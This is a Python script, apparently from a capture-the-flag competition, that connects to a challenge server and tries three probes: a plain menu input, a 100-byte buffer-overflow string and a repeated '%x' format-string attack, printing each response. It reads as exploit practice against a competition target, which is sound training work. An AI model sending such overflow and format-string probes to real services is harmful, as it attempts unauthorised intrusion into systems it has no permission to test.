#!/usr/bin/env python3
import socket
import time

def try_ultimate_final():
    """Try to get the flag by exploiting the vulnerability"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(("chals.uscc-cyberbowl-2025.ctf.institute", 3015))
    
    # Get initial data
    data = sock.recv(1024)
    print(f"Initial: {data}")
    
    # Get prompt
    data = sock.recv(1024)
    print(f"Prompt: {data}")
    
    # Try to send 7 and see what happens
    print("Sending 7...")
    sock.send(b"7\n")
    
    # Get response quickly
    data = sock.recv(1024)
    print(f"Response: {data}")
    
    # Try to get more data before connection closes
    try:
        more_data = sock.recv(1024)
        print(f"Additional data: {more_data}")
    except:
        print("Connection closed")
    
    sock.close()

def try_buffer_overflow_ultimate_final():
    """Try buffer overflow to get flag"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(("chals.uscc-cyberbowl-2025.ctf.institute", 3015))
    
    # Get initial data
    data = sock.recv(1024)
    print(f"Initial: {data}")
    
    # Get prompt
    data = sock.recv(1024)
    print(f"Prompt: {data}")
    
    # Try buffer overflow
    print("Trying buffer overflow...")
    sock.send(b"A" * 100 + b"7\n")
    
    # Get response quickly
    data = sock.recv(1024)
    print(f"Response: {data}")
    
    # Try to get more data before connection closes
    try:
        more_data = sock.recv(1024)
        print(f"Additional data: {more_data}")
    except:
        print("Connection closed")
    
    sock.close()

def try_format_string_ultimate_final():
    """Try format string attack"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(("chals.uscc-cyberbowl-2025.ctf.institute", 3015))
    
    # Get initial data
    data = sock.recv(1024)
    print(f"Initial: {data}")
    
    # Get prompt
    data = sock.recv(1024)
    print(f"Prompt: {data}")
    
    # Try format string attack
    print("Trying format string attack...")
    sock.send(b"%x" * 50 + b"7\n")
    
    # Get response quickly
    data = sock.recv(1024)
    print(f"Response: {data}")
    
    # Try to get more data before connection closes
    try:
        more_data = sock.recv(1024)
        print(f"Additional data: {more_data}")
    except:
        print("Connection closed")
    
    sock.close()

def main():
    print("=== Trying to get flag ===")
    try_ultimate_final()
    
    print("\n=== Trying buffer overflow ===")
    try_buffer_overflow_ultimate_final()
    
    print("\n=== Trying format string attack ===")
    try_format_string_ultimate_final()

if __name__ == "__main__":
    main()